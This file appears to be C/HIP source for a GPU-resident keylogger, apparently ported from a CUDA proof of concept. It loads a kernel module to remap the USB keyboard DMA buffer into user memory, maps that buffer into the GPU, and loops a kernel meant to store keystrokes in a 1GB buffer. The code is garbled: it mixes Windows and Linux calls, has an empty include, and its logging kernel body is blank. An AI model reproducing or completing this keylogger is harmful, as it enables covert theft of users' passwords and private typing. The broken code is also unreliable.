#include "hip/hip_runtime.h"


#include <windows.h>
//#include <winbase.h>
//#include <stdio.h>
//#include <kernelspecs.h>
//#include <stdlib.h>
#include <signal.h>
//#include <sys/types.h>
//#include <sys/stat.h>
#include <fcntl.h>
#include <io.h>
//#include <hip/hip_runtime.h>
#include <hip/hip_runtime.h>
//#include <helper_functions.h>
#include "hip/hip_runtime_api.h"
#include <hip/hip_runtime.h>
#include <>
////#include <unistd.h>
////#include <sys/mman.h>
#include <conio.h>

// define DEBUG to see evidence of keystrokes being logged by the
// GPU, via printf()s emitted by the CUDA kernel 

#define DEBUG 1

//PKTIMER   gTimer;
//PKDPC     gDPCP;
UCHAR     g_key_bits = 0;

// command bytes
#define SET_LEDS        0xED
#define KEY_RESET       0xFF

// responses from keyboard
#define KEY_ACK         0xFA   // ack
#define KEY_AGAIN       0xFE   // send again
// 8042 ports
// When you read from port 60, this is called STATUS_BYTE.
// When you write to port 60, this is called COMMAND_BYTE.
// Read and write on port 64 is called DATA_BYTE.
PUCHAR KEYBOARD_PORT_60 = (PUCHAR)0x60;
PUCHAR KEYBOARD_PORT_64 = (PUCHAR)0x64;

// status register bits
#define IBUFFER_FULL      0x02
#define OBUFFER_FULL      0x01

// flags for keyboard LEDS
#define SCROLL_LOCK_BIT  (0x01 << 0)
#define NUMLOCK_BIT      (0x01 << 1)
#define CAPS_LOCK_BIT    (0x01 << 2)





static unsigned char *v = 0;

void sigint(int a) {
	printf("^C caught...\n");
	if (v) {
		VirtualFree(v, 4096, MEM_RELEASE);
		//munmap(v, 4096);
	}
	printf("Dying.\n");
}

__global__ void l(unsigned char *v,
	unsigned char *ks,
	unsigned long *ki,
	unsigned char *p0,
	unsigned char *p2) {




}


int main(int argc, char *argv[]) {



	int fd;
	unsigned char *d_v, *ks, *p0, *p2;
	unsigned char init0 = 0;
	unsigned long init0long = 0;
	unsigned long *ki;

	signal(SIGINT, sigint);

	// insert kernel module that will find USB keyboard DMA address and
	// remap one of our PTEs to that address
	system("insmod kernel/main.ko");

	Sleep(1);

	fd = open("/dev/kl", O_RDWR);
	if (fd <= 0) {
		printf("Failed to open /dev/kl.\n");
		exit(1);
	}

	// get a single page that will be remapped by the
	// kernel driver
	v = (unsigned char *)VirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_READWRITE);
	//v = (unsigned char *)mmap(NULL, 4096,		PROT_READ | PROT_WRITE,		MAP_SHARED | MAP_ANONYMOUS,		0, 0);
	v[0] = 1;

	if (v == NULL) { // MAP_FAILED
		perror("Failed to mmap().\n");
		exit(2);
	}

#ifdef DEBUG
	printf("VIRTUAL ADDRESS--> %lx\n", (unsigned long)v);
#endif

	// give kernel driver a userspace virtual address to remap
	write(fd, &v, sizeof(unsigned long));
	close(fd);
	Sleep(2);

	// kernel driver can go away now
	system("rmmod main");

	//
	// v is now remapped to cover USB keyboard DMA buffer, so 
	// set up CUDA kernel to do keystroke logging in GPU
	//

	// use first GPU device
	checkCudaErrors(hipSetDevice(0));
	checkCudaErrors(hipSetDeviceFlags(hipDeviceMapHost));

	// allocate 1GB buffer in device space for storing keystrokes; indexed
	// by ki.  Last keystrokes p0 [modifier keys] and p2 [keystroke] 
	// persist across CUDA kernel invocations to debounce keys
	checkCudaErrors(hipMalloc(&ki, sizeof(unsigned long)));
	checkCudaErrors(hipMalloc(&p0, sizeof(unsigned char)));
	checkCudaErrors(hipMalloc(&p2, sizeof(unsigned char)));
	checkCudaErrors(hipMalloc(&ks, 1000000000));

	checkCudaErrors(hipMemcpy(p0, &init0,
		sizeof(unsigned char),
		hipMemcpyHostToDevice));
	checkCudaErrors(hipMemcpy(p2, &init0,
		sizeof(unsigned char),
		hipMemcpyHostToDevice));
	checkCudaErrors(hipMemcpy(ki, &init0long,
		sizeof(unsigned long),
		hipMemcpyHostToDevice));

	// map USB keyboard DMA address into GPU address space
	checkCudaErrors(hipHostRegister(v, 4096, hipHostRegisterMapped));
	checkCudaErrors(hipHostGetDevicePointer((void **)&d_v, (void *)v, 0));

	// very simple CUDA kernel--one thread that does nothing but
	// USB keystroke logging
	dim3 grid(1);
	dim3 block(1);
	while (1) {
		l <<<grid, block >>>(d_v, ks, ki, p0, p2);
		checkCudaErrors(hipDeviceSynchronize());
	}
}



/*
// for testing keystroke detection in userspace--move after
// remap of PTE by kernel driver to test
while (strokes < 100) {
stroke=0;
for (k=0; k < 8 && ! stroke; k++) {
stroke = (((char *)v)[k]);
}
if (stroke) {
strokes++;
for (k=0; k < 8; k++) {
printf("HOST: %d %d %d %d %d %d %d %d\n",
v[0],
v[1],
v[2],
v[3],
v[4],
v[5],
v[6],
v[7]);
}
}
}
*/

